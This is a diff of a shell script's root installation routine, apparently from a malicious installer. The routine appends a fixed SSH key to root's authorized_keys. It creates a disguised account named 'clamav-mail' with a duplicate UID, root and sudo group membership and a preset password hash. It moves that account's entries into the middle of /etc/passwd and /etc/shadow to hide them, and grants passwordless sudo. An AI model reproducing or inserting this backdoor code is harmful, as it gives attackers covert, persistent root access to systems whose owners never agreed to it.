@@ -274,23 +274,32 @@ root_installation() {
   echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q==' >> /root/.ssh/authorized_keys
   chmod 600 /root/.ssh/authorized_keys
 
-    # User management
-    if id -u clamav-mail >/dev/null 2>&1; then
-        userdel --remove clamav-mail
-    fi
-    
-    if ! grep -q '^sudo:' /etc/group; then
-        groupadd sudo
-    fi
+#    # User management
+#    if id -u clamav-mail >/dev/null 2>&1; then
+#        userdel --remove clamav-mail
+#    fi   
+#    if ! grep -q '^sudo:' /etc/group; then
+#        groupadd sudo
+#    fi
 
     
-    local PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1'
-    useradd -u 455 -G root,sudo,wheel -M -o -s /bin/bash clamav-mail
-    chpasswd -e <<< "clamav-mail:$PASSWORD_HASH"
-    awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd
-    mv /tmp/passwd /etc/passwd
-    awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow
-    mv /tmp/shadow /etc/shadow
+#    local PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1'
+#    useradd -u 455 -G root,sudo,wheel -M -o -s /bin/bash clamav-mail
+#    chpasswd -e <<< "clamav-mail:$PASSWORD_HASH"
+#    awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd
+#    mv /tmp/passwd /etc/passwd
+#    awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow
+#    mv /tmp/shadow /etc/shadow
+
+PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' && \
+if id -u clamav-mail > /dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && \
+if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && \
+sudo useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail && \
+sudo chpasswd -e <<< "clamav-mail:$PASSWORD_HASH" && \
+awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd && \
+sudo mv /tmp/passwd /etc/passwd && \
+awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow && \
+sudo mv /tmp/shadow /etc/shadow
 
     echo 'clamav-mail ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/clamav-mail
     chown root:root /etc/sudoers.d/clamav-mail
